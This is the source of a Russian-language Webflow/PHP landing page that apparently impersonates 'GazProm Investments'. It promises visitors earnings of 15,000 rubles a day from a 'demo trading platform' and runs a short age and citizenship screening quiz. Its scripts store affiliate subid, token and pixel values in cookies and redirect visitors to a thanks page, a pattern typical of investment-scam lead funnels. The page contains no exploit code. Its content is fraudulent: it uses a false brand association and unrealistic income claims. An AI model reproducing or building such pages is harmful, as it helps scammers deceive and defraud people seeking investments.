<?php
// if (!isset($rawClick) && !isset($click)) {
//   die();
// }
?>


<!DOCTYPE html><!--  This site was created in Webflow. https://webflow.com  --><!--  Last Published: Wed Jan 08 2025 16:11:15 GMT+0000 (Coordinated Universal Time)  -->
<html data-wf-page="65450e02b09296dd34073b46" data-wf-site="652f88b20bb4d9041f52bfc1">
<head>
  <meta charset="utf-8">
  <title>Quiz Gaz Phone</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="./css/modal.css">
  <link href="css/quiz-sber-phone.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Inter:200,300,regular,500,600,700,800"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
  <link href="images/webclip.png" rel="apple-touch-icon">
  
 <script type="application/javascript" src="track.js?v=21238"></script>

<script type="application/javascript">
  function getCookie(name) {
    var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
    return v ? v[2] : null;
  }

  function setCookie(name, value, days) {
    var d = new Date();
    d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
    document.cookie =
      name + "=" + value + ";path=/;expires=" + d.toGMTString();
  }

  function getSubId() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{subid}".match("{")) {
      return "{subid}";
    }
    var clientSubid =
      '<?php echo isset($client) ? $client->getSubid() : "" ?>';
    if (!clientSubid.match(">")) {
      return clientSubid;
    }
    if (params.get("_subid")) {
      return params.get("_subid");
    }
    if (params.get("subid")) {
      return params.get("subid");
    }
    if (getCookie("subid")) {
      return getCookie("subid");
    }
  }

  function getToken() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{token}".match("{")) {
      return "{token}";
    }
    var clientToken =
      '<?php echo isset($client) ? $client->getToken() : "" ?>';
    if (!clientToken.match(">")) {
      return clientToken;
    }
    if (params.get("_token")) {
      return params.get("_token");
    }
    if (params.get("token")) {
      return params.get("token");
    }
    if (getCookie("token")) {
      return getCookie("token");
    }
    return null;
  }

  function getPixel() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{pixel}".match("{")) {
      return "{pixel}";
    }
    if (params.get("pixel")) {
      return params.get("pixel");
    }

    if (getCookie("pixel")) {
      return getCookie("pixel");
    }

    return null;
  }

  if (typeof URLSearchParams === "function") {
    document.addEventListener("DOMContentLoaded", function (event) {
      var params = new URLSearchParams(document.location.search.substr(1));
      var subid = getSubId();
      var token = getToken();
      var pixel = getPixel();

      params.set("_token", token);
      setCookie("pixel", pixel);
      setCookie("token", token);
      setCookie("subid", subid);
      setCookie("_subid", subid);
      
      if (params.get("info")) {
        setCookie("info", params.get("info"), 30); // Срок действия куки - 30 дней
      }
    });
  }

  window.removeEventListener("beforeunload", trackClose);
</script>

    
</head>
<body class="body">
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/logo.svg" loading="lazy" sizes="(max-width: 479px) 36vw, (max-width: 767px) 13vw, (max-width: 991px) 14vw, 220px" alt="" class="image"><img src="images/Group-1000002477.png" loading="lazy" sizes="(max-width: 479px) 71vw, 100vw" srcset="images/Group-1000002477-p-500.png 500w, images/Group-1000002477-p-800.png 800w, images/Group-1000002477-p-1080.png 1080w, images/Group-1000002477-p-1600.png 1600w, images/Group-1000002477.png 1608w" alt="" class="image-2-copy">
        <div class="div-block-3">
          <h1 class="heading">Узнайте сколько вы можете заработать в ГазПром Инвестиции за пару сделок!</h1>
          <div class="text-block">Пройдите демо-версию нашей торговой платформы и начните зарабатывать от 15.000 руб в день уже сегодня 👇</div>
        </div>
        <a data-w-id="f895a1e2-c3a9-6c69-c65c-8625b05295cb" href="1.html" class="button w-button">Начать торговать</a>
      </div><img src="images/Group-1000002477.png" loading="lazy" sizes="(max-width: 479px) 100vw, (max-width: 767px) 45vw, (max-width: 991px) 44vw, 48vw" srcset="images/Group-1000002477-p-500.png 500w, images/Group-1000002477-p-800.png 800w, images/Group-1000002477-p-1080.png 1080w, images/Group-1000002477-p-1600.png 1600w, images/Group-1000002477.png 1608w" alt="" class="image-2">
    </div>
  </section>
  <!--------- QUESTION 1 --------->
        <div id="modal" class="modal">
          <div class="modal__content">
            <p class="modal__question">Вам исполнился 21 год?</p>
            <div class="modal__actions">
              <button class="modal__button--first modal__button--yes">
                Да
              </button>
                <a href="err.html" class="modal__button--first modal__button--no">Нет</a>
            </div>
          </div>
        </div>
        <!--------- QUESTION 2 --------->
        <div id="modal-3" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Являетесь ли вы гражданином Российской Федерации?</p>
            <div class="modal__actions">
              <button class="modal__button--third modal__button--yes">
                Да
              </button>
                <a href="err.html" class="modal__button--third modal__button--no">Нет</a>
            </div>
          </div>
        </div>
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=652f88b20bb4d9041f52bfc1" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  <script src="./js/main.js"></script>
  <script>
      localStorage.removeItem("answers");
  </script>
  <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>
</body>
</html>